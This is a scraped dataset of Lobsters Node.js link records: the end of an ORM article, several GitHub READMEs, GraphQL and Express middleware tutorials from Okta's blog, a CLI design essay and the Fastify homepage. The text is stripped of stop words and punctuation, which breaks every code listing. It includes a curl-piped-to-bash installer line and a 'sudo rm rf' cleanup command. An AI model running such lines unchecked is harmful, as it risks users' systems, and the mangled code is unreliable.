formatting unnecessary table name handwritten example query identical fact explain query run get score generated sequelize orm let take look query generated orm select dish id dish name dish veg item id itemsid item name itemsname item type itemstype item ingredient dishid itemsingredientdishid item ingredient itemid itemsingredientitemid item ingredient quantity itemsingredientquantity item ingredient unit itemsingredientunit dish dish left outer join ingredient item ingredient inner join item item item id item ingredient itemid dish id item ingredient dishid dish id newlines added readability tell query lot different previous two query behaving differently well due relationship defined sequelize trying get information asked particular getting information dish really care ingredient belonging dish cost query according explain reason orm everything query represented orm operation need generate query fall back generating sql query hand often mean codebase heavy orm usage still handwritten query strewn implication developer working one project end needing know orm syntax well underlying sql syntax common situation work well orms query contains subquery consider situation know already purchased ingredient dish database however still need purchase whatever ingredient needed dish order get list might run following query select item id select itemid ingredient dishid id select itemid ingredient dishid best knowledge query cleanly represented using aforementioned orms combat situation common orm offer ability inject raw sql query interface sequelize offer query method execute raw sql using underlying database driver bookshelf objection orms get access raw knex object provide instantiation use query builder power knex object also raw method execute raw sql sequelize also get sequelizeliteral method used intersperse raw sql various part sequelize orm call situation still need know underlying sql generate certain query query builder sweet spot using lowlevel database driver module rather enticing overhead generating query database manually writing query overall dependency project relies upon also minimized however generating dynamic query tedious opinion biggest drawback using simple database driver consider example web interface user select criterion want retrieve item single option user input color query might look like following select thing color single query work nicely simple database driver however consider color optional second optional field called isheavy need support different permutation query select thing neitherselect thing color color onlyselect thing isheavy heavy onlyselect thing color isheavy however due aforementioned reason fully featured orm tool want reach either query builder end pretty nice tool situation interface exposed knex close underlying sql query forced always know sql query look like relationship similar something like typescript translates javascript using query build fine solution long fully understand underlying sql generating never use tool hide happening lower layer use matter convenience situation know exactly ever find questioning generated query actually look like add debug field knex instantiation call look like const knex require knex client pg connection debug true enable query debugging fact library mentioned post include sort method debugging call executed looked three different layer abstracting database interaction namely lowlevel database driver query builder highlevel orms also examined tradeoff using layer well sql query generated includes difficulty generating dynamic query database driver added complexity orms finally sweet spot using query generator thank reading sure take consideration build next project done following along may run following command completely remove docker container remove database file computer docker stop pgnodeorms docker rm pgnodeorms sudo rm rf datapgnodeorms monitor failed slow network request production deploying nodebased web app website easy part making sure node instance continues serve resource app thing get tougher interested ensuring request backend third party service successful try logrocket http logrocketcomsignuplogrocket like dvr web apps recording literally everything happens site instead guessing problem happen aggregate report problematic network request quickly understand root cause logrocket instrument app record baseline performance timing page load time time first byte slow network request also log redux ngrx vuex actionsstate start monitoring free
171,Lobsters,nodejs,Node.js programming,A light-weight command line tool to create a node module,https://github.com/LanceGin/npg,lightweight command line tool create node module,join github today sign file permalink npg screenshot installation usage structure license topic resource reload reload,dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time npg npg node package generator npg command line tool generate node package basic template screenshot installation usage npg h usage npg command option option v version output version number h help output usage information command initi name generate new node module structure node package readmemd npmignore babelrc eslintrcjs gitignore packagejson src indexjs source file package would put src directory want publish package run npm run build build src lib eslint rule base airbnb run npm run lint check code license mit node package generator topic resource perform action time signed another tab window reload refresh session signed another tab window reload refresh session
172,Lobsters,nodejs,Node.js programming,keywords-extract - Command line tool extract keywords from any web page,https://github.com/vladocar/keywordsextract,keywordsextract command line tool extract keywords web page,keywordsextract extract keywords website install use license,keywordsextract extract keywords website extract keywords nodejs console command line tool keyword extraction nodejs project work mainly two node module nodereadability filter main text clearing noise main text gramophone module filter keywords text install use npm g keywordsextract example keywordsextract url http enwikipediaorgwikisearchengineoptimization n use two parameter url url address n number word example n mean word max word keywords displayed console titletxt file created keywords license project licensed mit license
173,Lobsters,nodejs,Node.js programming,PDFSave - Convert websites into readable PDFs,https://github.com/vladocar/PDFSave,pdfsave convert website readable pdfs,pdfsave web pdf installation use license,pdfsave web pdf convert website lightweight readable pdfs pdfsave us nodereadability clearing non essential content later pdfkit convert html lightweight pdf pdfsave text nt save image multimedia content installation use pdfsave url http wwwlipsumcom license project licensed mit license
174,Lobsters,nodejs,Node.js programming,"Build a Simple Web App with Express, React and GraphQL",https://developer.okta.com/blog/2018/10/11/build-simple-web-app-with-express-react-graphql,build simple web app express react graphql,create react app create react app create graphql server abstract syntax tree connect react graphql apollo add ability edit post graphql final form add user authentication react graphql web app sign foreverfree developer account application add application singlepage app next done client id envlocal api token create token okta react sdk react router add user authentication server learn graphql react express web security randall blog github oktadev facebook youtube channel,graphql react become quite popular last year safe say go together like avocado toast graphql server written node let easily create flexible api using javascript class function frontend developer query server information asked get processed mean make backend robust want keeping frontend light requesting information needed page viewing graphql relatively new standard defining type querying data quite different implementation serverside clientside today show use express create graphql server well create singlepage app react us apollo client query server create react app quickest way get started react app use create react app already node yarn create react app installed run following command curl http bash npm install global yarn createreactapp next create start new app createreactapp graphqlexpressreact cd graphqlexpressreact yarn start run createreactapp get new folder everything need get started dependency need installed locally using yarn type yarn start within folder starting frontend development server automatically update whenever edit file create graphql server continue writing frontend need server connect run following command install dependency need get running yarn add express cors graphql expressgraphql graphqltag create new directory project src folder named server create new file named indexjs following code const express require express const cors require cors const graphqlhttp require expressgraphql const gql require graphqltag const buildastschema require graphql const post author john doe body hello world author jane doe body hi planet const schema buildastschema gql type query post post post id id post type post id id author string body string const mappost post id post id post const root post postsmap mappost post id mappost post id id const app express appuse cors appuse graphql graphqlhttp schema rootvalue root graphiql true const port processenvport applisten port consolelog running graphql api server localhost port graphql let explain different part code top file use require tag import dependency native node support import tag yet use require instead future version node likely support import create react app us babel transpile code running allows use import syntax react code see get frontend code using mock data const post contains item contains author body gql tag allows favorite code editor realize writing graphql code stylize appropriately also par string convert graphql ast abstract syntax tree need build schema using buildastschema graphql schema might interesting part code defines different type allows say client query also automatically generate useful documentation focus coding type query post post post id id post type post id id author string body string defined post type contains id author body need say type element author body use primitive string type id id query type special type let query data saying post give array post want single post query calling post passing id const mappost post id post id post const root post postsmap mappost post id mappost post id id need provide set resolvers tell graphql handle query someone query post run function providing array post using index id query post expects id return post given index const app express appuse cors appuse graphql graphqlhttp schema rootvalue root graphiql true const port processenvport applisten port consolelog running graphql api server localhost port graphql able create server graphqlhttp function creates express server running graphql expects resolvers rootvalue schema graphiql flag optional run server allowing easily visualize data see autogenerated documentation run applisten starting graphql server make sure easily run server client time add following dev dependency yarn add nodemon npmrunall next edit packagejson file script section look like start npmrunall parallel watch server start web start web reactscripts start start server node srcserver watch server nodemon watch srcserver srcserver build reactscripts build test reactscripts test envjsdom eject reactscripts eject close existing web server simply type yarn start run server client time whenever make change server server restart whenever make change frontend code page automatically refresh latest change point browser http get graphiql server always come back refresh changing code around server see latest schema test query connect react graphql next need connect frontend graphql use bootstrap decent styling minimal effort apollo make great react client link graphql server install dependency need frontend run following yarn add bootstrap reactstrap apolloboost reactapollo need configure apollo client know connect backend create new file srcapollojs following code import apolloclient apolloboost export default new apolloclient uri http order apollo query react component able connect using client entire app need wrapped apolloprovider component also want include styling bootstrap get rid indexcss file came create react app make following change srcindexjs file import react react import reactdom reactdom import indexcss import apolloprovider reactapollo import bootstrapdistcssbootstrapmincss import app app import registerserviceworker registerserviceworker import client apollo reactdomrender app documentgetelementbyid root reactdomrender apolloprovider client client app apolloprovider documentgetelementbyid root serviceworkerunregister modulehot modulehotaccept modulehotaccept really necessary make component changing within app refresh update rather refreshing entire page every may need refresh reset state app generally lead quicker turnaround time create new file srcpostviewerjs fetch data render table import react react import gql graphqltag import query reactapollo import table reactstrap export const getposts gql query getposts post id author body export default query query getposts loading data loading table thead tr th author th th body th tr thead tbody datapostsmap post tr key postid td postauthor td td postbody td tr tbody table query query component requires graphql query case getting post id author body query component also requires render function child provides loading state case show anything loading since really quick fetch data locally done loading data variable object including data requested code render table table component includes bootstrap class need make look pretty post change srcappjs file include postviewer component made look like import react component react import postviewer postviewer class app extends component render return main postviewer main export default app go http see add ability edit post graphql graphql query typically readonly want modify data use known mutation instead create new mutation type const schema srcserverindexjs submit post create input type simplify input variable new mutation return new post success type mutation submitpost input postinput post input postinput id id author string body string need update root variable create new resolver submitpost well add following resolver submitpost input id author body const post author body let index postslength id null id id postslength post id authorid authorid return null postssplice id post index id else postspush post return mappost post index provide id try find post index replace data author body provided otherwise add new post return post provided along new id send mutation request graphql define piece want back frontend need create new component editing post form react made easier library called final form install yarn yarn add finalform reactfinalform make new file srcposteditorjs fill following explain detail import react react import gql graphqltag import button form formgroup label modal modalheader modalbody modalfooter reactstrap import form finalform field reactfinalform import client apollo import getposts postviewer const submitpost gql mutation submitpost input postinput submitpost input input id const posteditor post onclose finalform onsubmit async id author body const input id author body await clientmutate variable input mutation submitpost refetchqueries query getposts onclose initialvalues post render handlesubmit pristine invalid modal isopen toggle onclose form onsubmit handlesubmit modalheader toggle onclose postid edit post new post modalheader modalbody formgroup label author label field required name author classname formcontrol component input formgroup formgroup label body label field required name body classname formcontrol component input formgroup modalbody modalfooter button type submit disabled pristine color primary save button button color secondary onclick onclose cancel button modalfooter form modal export default posteditor submitpost mutation new mutation connect backend use postinput type defined server const submitpost gql mutation submitpost input postinput submitpost input input id final form take onsubmit function pas data entered user post submitted want close modal posteditor take onclose prop call done submitting final form also take initialvalues object define value form initially case posteditor component take post prop variable need get passed along initial value required prop render function render form final form give useful form prop know form valid modified initialvalues const posteditor post onclose finalform onsubmit initialvalues post render export default posteditor onsubmit function call mutation needed submit post apollo let refetch query since know list post date submit edits refetch getposts query onsubmit async id author body const input id author body await clientmutate variable input mutation submitpost refetchqueries query getposts onclose render function display bootstrap modal posteditor component rendered want open isopen set true also use onclose prop close modal user click outside modal hit esc click cancel button form need handlesubmit function passed onsubmit prop tell form go final form instead sending post request page final form also handle boilerplate needed controlled input instead storing data state whenever user type something use field component render handlesubmit pristine invalid modal isopen toggle onclose form onsubmit handlesubmit modalheader toggle onclose postid edit post new post modalheader modalbody formgroup label author label field required name author classname formcontrol component input formgroup formgroup label body label field required name body classname formcontrol component input formgroup modalbody modalfooter button type submit disabled pristine color primary save button button color secondary onclick onclose cancel button modalfooter form modal next make couple small change postviewer add hook row determine whether row editable change style bit let click row clicking row call another callback use set post edited diff git asrcpostviewerjs bsrcpostviewerjs index asrcpostviewerjs bsrcpostviewerjs export const getposts gql export default const rowstyles post canedit canedit post cursor pointer fontweight bold const postviewer canedit onedit query query getposts loading data loading table export default thead tbody datapostsmap post tr key postid tr key postid style rowstyles post canedit onclick canedit post onedit post td postauthor td td postbody td tr export default query postviewerdefaultprops canedit false onedit null export default postviewer tie together srcappjs create new post button create new post make edit existing post well import react component react import button container reactstrap import postviewer postviewer import posteditor posteditor class app extends component state editing null render const editing thisstate return container fluid button classname color primary onclick thissetstate editing new post button postviewer canedit true onedit post thissetstate editing post editing posteditor post editing onclose thissetstate editing null container export default app add user authentication react graphql web app one simple way add authentication project okta okta cloud service allows developer create edit securely store user account user account data connect one multiple application already one sign foreverfree developer account log developer console navigate application click add application select singlepage app click next since create react app run port default add base uri login redirect uri setting look like following click done save app copy client id paste variable file called envlocal root project allow access file code without needing store credential source control also need add organization url without admin suffix environment variable nodeenv need start reactapp order create react app read file end looking like envlocal reactappoktaclientid yourclientid reactappoktaorgurlhttps youroktadomain also going need api token later server navigate api token click create token many token give one name reminds like graphql express given token see right lose token create another one add env also reactappoktatoken youroktaapitoken easiest way add authentication okta react app use okta react sdk also need add route done using react router yarn add oktaoktareact reactrouterdom order know user authenticated okta requires app wrapped security component configuration also depends react router end browserrouter component wrapping security component wrapping apolloprovider component finally wrap app route srcindexjs file end looking like import react react import reactdom reactdom import browserrouter route reactrouterdom import security implicitcallback oktaoktareact import apolloprovider reactapollo import bootstrapdistcssbootstrapmincss import app app import registerserviceworker registerserviceworker import client apollo reactdomrender browserrouter security issuer processenvreactappoktaorgurl redirecturi windowlocationorigin implicitcallback clientid processenvreactappoktaclientid apolloprovider client client route path implicitcallback component implicitcallback route path component app apolloprovider security browserrouter documentgetelementbyid root registerserviceworker modulehot modulehotaccept okta sdk come withauth higher order component hoc used wide variety authrelated thing example need know whether authenticated information user make little easier wrote simple hoc override one come okta sdk create new file srcwithauthjs containing following import react react import withauth oktaoktareact export default component withauth class withauth extends reactcomponent state thispropsauth authenticated null user null loading true componentdidmount thisupdateauth componentdidupdate thisupdateauth async updateauth const authenticated await thispropsauthisauthenticated authenticated thisstateauthenticated const user await thispropsauthgetuser thissetstate authenticated user loading false render const auth prop thisprops return component prop auth thisstate wrapping component new function app automatically rerendered whenever user log able access information user wrap app component withauth hoc short time app first load okta quite sure whether user logged keep thing simple render anything app component loading period could however choose render post disable editing know information user top render function srcappjs add following const auth thisprops authloading return null const user login logout auth replace new post button following code render sign button logged logged instead see new post button well sign button make must logged order create new post user div button classname color primary onclick thissetstate editing new post button button classname color secondary onclick logout sign signed username button div button classname color primary onclick login sign button make sure also edit post unless logged change canedit prop check user canedit boolean user also need export withauth app instead app srcappjs file look like import react component react import button container reactstrap import postviewer postviewer import posteditor posteditor import withauth withauth class app extends component state editing null render const auth thisprops authloading return null const user login logout auth const editing thisstate return container fluid user div button classname color primary onclick thissetstate editing new post button button classname color secondary onclick logout sign signed username button div button classname color primary onclick login sign button postviewer canedit boolean user onedit post thissetstate editing post editing posteditor post editing onclose thissetstate editing null container export default withauth app add user authentication server web app requires logged create post savvy user could still modify data sending request directly server prevent add authentication server need add okta node sdk jwt verifier dependency also need use dotenv order read variable envlocal yarn add oktajwtverifier oktaoktasdknodejs dotenv top srcserverindexjs file need tell dotenv read environment variable require dotenv config path envlocal going need frontend send json web token jwt user identify get jwt server need verify using okta jwt verifier get information user also need use okta node sdk set near top server require statement const client require oktaoktasdknodejs const oktajwtverifier require oktajwtverifier const oktajwtverifier new oktajwtverifier clientid processenvreactappoktaclientid issuer processenvreactappoktaorgurl const client new client orgurl processenvreactappoktaorgurl token processenvreactappoktatoken going using real user make much sense send string username especially since could change time would better post associated user set create new author variable user change post variable authorid instead author string const author id name john doe id name jane doe const post authorid body hello world authorid body hi planet schema longer need author string input postinput author post type author instead string also need make new author type type author id id name string looking user want pull author author variable const mappost post id post post id author author postauthorid need create getuserid function verify access token fetch information user token sent authorization header look something like bearer eyjrawq following function add author name author object already exist const getuserid async authorization try const accesstoken authorizationtrim split const claim uid await oktajwtverifierverifyaccesstoken accesstoken author uid const profile firstname lastname await clientgetuser uid author uid id uid name firstname lastname filter boolean join return uid catch error return null change submitpost function get user id post user logged return null prevent post getting created also return null user trying edit post create submitpost input id author body const post author body submitpost async input id body header const authorid await getuserid header authorid return null const post authorid body let index postslength id null id id postslength post id authorid authorid return null postssplice id post index id else final srcserverindexjs file look like require dotenv config path envlocal const express require express const cors require cors const graphqlhttp require expressgraphql const gql require graphqltag const buildastschema require graphql const client require oktaoktasdknodejs const oktajwtverifier require oktajwtverifier const oktajwtverifier new oktajwtverifier clientid processenvreactappoktaclientid issuer processenvreactappoktaorgurl const client new client orgurl processenvreactappoktaorgurl token processenvreactappoktatoken const author id name john doe id name jane doe const post authorid body hello world authorid body hi planet const schema buildastschema gql type query post post post id id post type mutation submitpost input postinput post input postinput id id body string type post id id author author body string type author id id name string const mappost post id post post id author author postauthorid const getuserid async authorization try const accesstoken authorizationtrim split const claim uid await oktajwtverifierverifyaccesstoken accesstoken author uid const profile firstname lastname await clientgetuser uid author uid id uid name firstname lastname filter boolean join return uid catch error return null const root post postsmap mappost post id mappost post id id submitpost async input id body header const authorid await getuserid header authorid return null const post authorid body let index postslength id null id id postslength post id authorid authorid return null postssplice id post index id else postspush post return mappost post index const app express appuse cors appuse graphql graphqlhttp schema rootvalue root graphiql true const port processenvport applisten port consolelog running graphql api server localhost port graphql need make frontend change make sure requesting author object instead assuming string need pas auth token header postviewer component need minor update diff git asrcpostviewerjs bsrcpostviewerjs index asrcpostviewerjs bsrcpostviewerjs export const getposts gql query getposts post id author author id name body const postviewer canedit onedit style rowstyles post canedit onclick canedit post onedit post td postauthor td td postauthorname td td postbody td tr posteditor need get rid author altogether since editable user determined auth token diff git asrcposteditorjs bsrcposteditorjs index asrcposteditorjs bsrcposteditorjs const submitpost gql const posteditor post onclose finalform onsubmit async id author body const input id author body onsubmit async id body const input id body await clientmutate variable input const posteditor post onclose postid edit post new post modalheader modalbody formgroup label author label field required name author classname formcontrol component input formgroup formgroup label body label field apollo client sending auth token order access auth token need sort closure request apollo let modify header change srcapollojs following import apolloclient apolloboost let auth export const updateauth newauth auth newauth export default new apolloclient uri http request async operation const token await authgetaccesstoken operationsetcontext header authorization bearer token need call updateauth component whenever auth change srcwithauthjs make sure always date diff git asrcwithauthjs bsrcwithauthjs index asrcwithauthjs bsrcwithauthjs import react react import withauth oktaoktareact import updateauth apollo export default component withauth class withauth extends reactcomponent state thispropsauth export default component withauth class withauth extends reactcomponent async updateauth updateauth thispropsauth const authenticated await thispropsauthisauthenticated authenticated thisstateauthenticated const user await thispropsauthgetuser change canedit srcappjs file make user edit post onchange post user usersub postauthorid learn graphql react express web security successfully built graphql server hooked react locked secure user authentication exercise see switch server using simple inmemory javascript object using persistent data storage example using sequelize node check randall blog like see final sample code find github like learn graphql express react check post okta developer blog question post please add comment awesome content follow oktadev twitter like u facebook subscribe youtube channel
175,Lobsters,nodejs,Node.js programming,12 Factor CLI Apps,https://medium.com/@jdxcode/12-factor-cli-apps-dd3c227a0e46,factor cli apps,factor app oclif great help essential must shell completion prefer flag args variable much version mind stream short stdout output stderr messaging handle thing going wrong debug fancy nocolor prompt use table jq speedy encourage contribution make sure pick license course contribution guideline doc add code conduct plugins system clear subcommands wwwmyappcom follow xdgspec xdgspec,cli fantastic way build product unlike web application take small fraction time build much powerful web whatever developer programmed cli easily mashup multiple tool together perform advanced task require technical expertise use still work well admin task poweruser task developer productsat heroku come methodology called factor app set principle designed make great web application easy maintain spirit cli factor keep mind building next cli application following principle offer cli ux user lovewe also built cli framework called oclif designed follow principle build great cli great help essentialhaving good help documentation cli extremely important far important building web application guide user uia cli provide incli help help web readmes great place provides immediateness needing leave terminal also giving google opportunity help user make sure google indexing doc btw unless already know user want man page bother also outputting used often enough anymore novice developer unaware work window offline support necessary already incli help still man page support coming oclif framework think make sense solved oclif cli reap benefitsin cli make sure following display help control user input must show help list command mycli mycli help mycli help mycli h get help subcommand mycli subcommand help mycli subcommand hh help reserved flag used help case mycli subcommand help guarantee help argument passed subcommand case better show help would otherwise error invalid argument error actually heroku app named help caused problem beforeshell completion another great way offer help usersin term help show description command description argument description flag importantly provide example common usage cli even usage obvious far common referenced bit documentation user findof course building cli oclif get free online doc incli doc autocomplete even working linter help enforce description everywhereexample oclif readme prefer flag argsa cli accept type shell input flag args flag require bit typing make cli much clearer example heroku cli used command called heroku fork took source app copy destination app copy initially used flag argument like heroku fork fromapp app toappusing flag arg really confusing source destination app changed use flag heroku fork fromapp toappthis way clear source destinationnote actually removed command heroku cli still great example args confusingsometimes args fine though argument obvious rm filetoremove good rule thumb type argument fine type suspect never goodfor variable length argument fine multiple argument example rm different type becomes confusing userflags also much easier write autocomplete logic know exactly value befor cli pas flag process heroku run flag parser accept argument denote stop parsing simply pas everything argument allows run command like heroku run myapp myscriptsh show flag heroku run also different passed dyno version ensure get cli version following mycli version multi mycli version mycli vunless singlecommand cli also v verbose flag mycli v also display cli version frustrating run different command get version cli find right onethe version command main place ask user debugging information good place add helpful extra information aside version number might help diagnose issuesi also suggest sending version string useragent debug serverside issue assuming cli us api sort mind streamsstdout stderr provide way output message user also allowing redirect content file example myapp footxtwarning something went wrongbecause warning stderr end file putting warning stdout would hide warning would especially problematic structured data like json binary use stderr error warning default always end screen even stdout redirectednot everything stderr error though example use curl download file progress output stderr allows redirect stdout still seeing progressin short stdout output stderr messagingif run subcommand cli make sure pipe stderr subcommand user always way issue surfaced ultimately user handle thing going wrongthings go wrong cli much often web apps without ui guide user thing display error user expected behavior part using clifirst foremost make error informative great error message contain following error codeerror titleerror description optional fix errorurl informationfor example cli errored file permission issue could show following myapp dump myfileouterror eperm invalid permission myfileoutcannot write myfileout file write permissionsfix chmod w myfileouthttps githubcomjdxcodemyappjust think every cli helpful incredible would programmersometimes though unhandled error expect user run way view full traceback information well full debug output environment variablesin oclif use debug module allows u output debug statement grouped component debug environment variable set lot verbose logging debug fully enabled incredibly valuable u debugging issueserror log also useful postmortem debugging ensure timestamps truncate occasionally eat space disk make sure contain ansi color fancy spinner examplemodern cli afraid show use colorsdimming highlight important information use spinner progress bar show longrunning task tell user still working leverage o notification longrunning task donestill need able fall back know fall back basic behavior user stdout connected tty usually mean piping file display color stdout likewise stderr spinner progress bar also good idea tty work outputting ansi code overwrite work screen never want output code filethe user may reason wanting fancy output respect termdumb nocolor set specify nocolor would also suggest adding appspecific environment variable well case want disable color prompt canfor accepting input stdin tty prompt rather forcing user specify flag never require prompt though user need able automate cli script allow override prompt alwaysprompt exampleanother great place add prompt confirmation dialog dangerous action example destroying heroku app need type app name confirm checkboxes radio button great way improve cli ux want present option user visually transferring multiple apps new user heroku use tablesnote clitable cliux allows easily create table following principlestables common way output data cli important row output single entry data never output table border noisy huge pain parsing example keeping row single entry thing like pipe wc get count line grep filter line listing file piping wc count number file file j name note wc count line word character may also notice l follows factor behaves differently piped v outputting screen tty mindful screen width show column default allow user pas column commaseparated list column name add le common typestruncate row going spill current screen width unless notruncate setshow column header default allow hidden noheadersallow user pas filter filter specific column grep usually flag filter specific cell value allow sorting column sort allow inverse multicolumn sort wellallow output csv json displaying raw output json great way output structured data manipulated jq jq incredibly useful cut awk simpler tool work better csv speedyclis need start quickly use time mycli benchmark cli rough guide fast sadly feasible scripting language fast enough aim usable going impress languid user prefer avoid cli pointobviously cli performing major task like downloading large file something heavily cpubound perform quickly case make sure show progress bar least spinner even spinner give impression cli much faster isoclif designed minimal overhead right box sits around good node get need require j file cli command run even hundred command overhead still encourage contributionskeep code open source allows user poke around diagnose problem healthy community offer sample case useful others make organization look great wellmake sure pick license course github gitlab great place put cli readme give perfect place provide overview cliwrite run cli locally run test suite offer contribution guideline doc tell contributor expect term commit syntax code quality test whatever else important knowadd code conduct even feel necessary important people feel much better seeing one others probably even notice helpful event someone rude document point toin oclif plugins system offer great way people extend cli plugins later included core plugin provide functionality clear subcommandsthere type cli single multicommand singlecommand cli basic unixstyle cli like cp grep multicommands like git npm accept subcommand first argumentif cli simple performs one basic task good fit singlecommand cli cli however probably benefit using subcommandseither way user pas anything argument cli always better list subcommands multi display help single rather default behavior usually user anything elsewhen start using subcommands take long subsubcommands become useful call topic oclif git chooses separate subcommands topic space git submodule add git githubcom oclifcommandwhere heroku cli use colon heroku domain add wwwmyappcomcolons preferable help delineate command argument passed command user quickly learns argument command get help itgetting weed little bit another technical reason prefer colon topiclevel command like heroku domain list domain app used space separate command subcommands wanted topiclevel command accept argument parser could way determine argument subcommand argument topic command therefore using space separate make topiccommands also accept follow xdgspecxdgspec great standard used find put file unless environment variable like xdgconfighome say otherwise use configmyapp config file localsharemyapp data filesfor cache file though use cachemyapp unix macos better default librarycachesmyapp window use localappdata myapp
177,Lobsters,nodejs,Node.js programming,"Fastify, Fast and low overhead web framework, for Node.js",https://www.fastify.io/,fastify fast low overhead web framework nodejs,quick start requestresponse validation hook typescript support documentation,quick startget fastify npm npm install fastifythen create serverjs add following content require framework instantiate const fastify require fastify logger true declare route fastifyget request reply replysend hello world run server fastifylisten err err fastifylogerror err processexit fastifyloginfo server listening fastifyserveraddress port require framework instantiate const fastify require fastify logger true declare route fastifyget async request reply return hello world run server const start async try await fastifylisten fastifyloginfo server listening fastifyserveraddress port catch err fastifylogerror err processexit start finally launch server node serverand test curl http validation hooksof course fastify much thisfor example easily provide input output validation using json schema perform specific operation handler executed const fastify require fastify logger true fastifyroute method get url schema request need querystring name parameter querystring name type string response need object hello property type string response type object property hello type string function executed every request handler executed prehandler request reply done eg check authentication done handler request reply replysend hello world fastifylisten err err fastifylogerror err processexit fastifyloginfo server listening fastifyserveraddress port const fastify require fastify logger true fastifyroute method get url schema request need querystring name parameter querystring name type string response need object hello property type string response type object property hello type string function executed every request handler executed prehandler async request reply eg check authentication handler async request reply return hello world const start async try await fastifylisten fastifyloginfo server listening fastifyserveraddress port catch err fastifylogerror err processexit start typescript supportfastify shipped typing file may need install typesnode depending nodejs version usingthe following example creates http serverwe pas relevant typing http version usedby passing type get correctly typed access underlying http object routesif using pas http pas httpsecureserver instead serverthis ensures within server handler also get httpserverresponse correct typing replyresimport fastify fastify import server incomingmessage serverresponse http const server fastifyfastifyinstance fastify const opts fastifyrouteshorthandoptions schema response type object property pong type string serverget ping opts request reply replysend pong worked serverlisten err err serverlogerror err processexit serverloginfo server listening serverserveraddress port import fastify fastify import server incomingmessage serverresponse http const server fastifyfastifyinstance fastify const opts fastifyrouteshorthandoptions schema response type object property pong type string serverget ping opts async request reply return pong worked serverlisten err err serverlogerror err processexit serverloginfo server listening serverserveraddress port visit documentation learn feature fastify offer
178,Lobsters,nodejs,Node.js programming,Babel 7 Node API Starter base,https://gitlab.com/halfmanhalfdonut/node-api-starter,babel node api starter base,nodeapistarter,nodeapistarter project id
179,Lobsters,nodejs,Node.js programming,Build and Understand Express Middleware through Examples,https://developer.okta.com/blog/2018/09/13/build-and-understand-express-middleware-through-examples,build understand express middleware example,express express middleware requirement write express middleware install node postman express middleware basic applicationlevel middleware express request logging middleware example restrict express request content type example thirdparty express middleware okta express application identity management okta oidc express middleware middleware order important error handling express middleware learn express middleware expressjs quickstart github repo okta node sdk oktadev,done significant node development past seven eight year probably used express build web server point create server node without using library give lot box quite cumbersome add functionality express minimalist unopinionated server library become de facto standard building web apps node understand express need understand express middleware express middleware middleware literally mean anything put middle one layer software another express middleware function execute lifecycle request express server middleware access http request response route path attached fact express compromised wholly middleware function additionally middleware either terminate http request pas another middleware function using next soon chaining middleware allows compartmentalize code create reusable middleware article explain middleware would use use existing express middleware write middleware express requirement write express middleware thing need installed create use test express middleware first need node npm ensure installed run see node npm version installed get error need install node using latest version time article node npm example work node version npm version also using express version important major change made version also helpful postman installed test route using http verb get express middleware basic get started use basic express builtin middleware give chance see middleware used express middleware structured create new project npm init npm init npm install express save create serverjs paste following code const express require express const app express appget req re next ressend welcome home applisten run server via node serverjs access http see welcome home printed browser appget function applicationlevel middleware notice parameter passed method req re next incoming request response written method call pas call next middleware function current middleware finished case response sent function exit could also chain middleware calling next method let take look example different type middleware express request logging middleware example express set middleware global middleware meaning called every incoming request change content serverjs const express require express const app express appuse req re next consolelog req next appget req re next ressend welcome home applisten time go http see thing browser window back console window see output incoming request object middleware log request object call next next middleware pipeline handle get request root url sends back text response using appuse mean middleware called every call application restrict express request content type example addition running middleware call could also specify run middleware specific call change serverjs file const express require express const app express const requirejsoncontent return req re next reqheaders contenttype applicationjson resstatus send server requires applicationjson else next appget req re next ressend welcome home apppost requirejsoncontent req re next ressend sent json applisten time start server running test open postman create post request http set header run request get back server requires applicationjson message go back add contenttype header value applicationjson run request get sent json message back server apppost method call add requirejsoncontent middleware function ensure incoming request payload contenttype header value set applicationjson pas check error response sent request handed next piece middleware chain via next method thirdparty express middleware built couple custom middlewares far lot package already built thing might normally want fact used simple routing middleware library using appget apppost middleware function thousand middleware library thing like parsing incoming data routing authorization okta express middleware oidc security show demonstrate using thirdparty middleware library okta express application okta goal make identity management lot easier secure scalable used okta cloud service allows developer create edit securely store user account user account data connect one multiple application api enables okta oidc express middleware install okta oidc middleware express run npm install oktaoidcmiddleware save serverjs file create instance middleware configuration option okta know connect okta application const oidc new expressoidc issuer http youroktadomain clientid yourclientid clientsecret yourclientsecret redirecturi http scope openid profile also need tell express use oidc middleware router instead default router use like middleware appget protected oidcensureauthenticated req re ressend top secret oidcensureauthenticated function middleware okta library run function see current user logged call next let appget function continue handling request send back http unauthorized response middleware order important request received express middleware match request run order initialized terminating action like response sent error occurs middleware meant handle error called order one call next function call error handling express middleware express builtin default error handler inserted end middleware pipeline handle unhandled error may occurred pipeline signature add error parameter standard parameter request response next basic signature look like appuse err req re next middleware functionality order call errorhandling middleware simply pas error next like appget myotherthing req re next next new error passing error appuse err req re next consolelog err resheaderssent resstatus send errmessage case error handling middleware end pipeline handle error might also notice checked resheaderssent property check see response already sent header client sends http status error message client also chain errorhandling middleware common handle different type error different way instance appget nonexistant req re next let err new error couldnt find errhttpstatuscode next err appget problematic req re next let err new error sorry cant dave errhttpstatuscode next err handle found error appuse err req re next errhttpstatuscode resstatus render notfound next err handle unauthorized error appuse err req re next errhttpstatuscode resstatus render unauthorized next err catch appuse err req re next consolelog err resheaderssent resstatus errhttpstatuscode render unknownerror case middleware check see found error thrown render notfound template page pass error next item middleware next middleware check see unauthorized error thrown render unauthorized page pass error next middleware pipeline finally catch error handler log error response sent sends error httpstatuscode http status none provided render unknownerror template learn express middleware detailed instruction setting okta oidc middleware follow expressjs quickstart also list officially supported express middleware github repo try dig learn finally interested learning use okta okta node sdk implementing user management functionality application always love hear thought question comment twitter oktadev
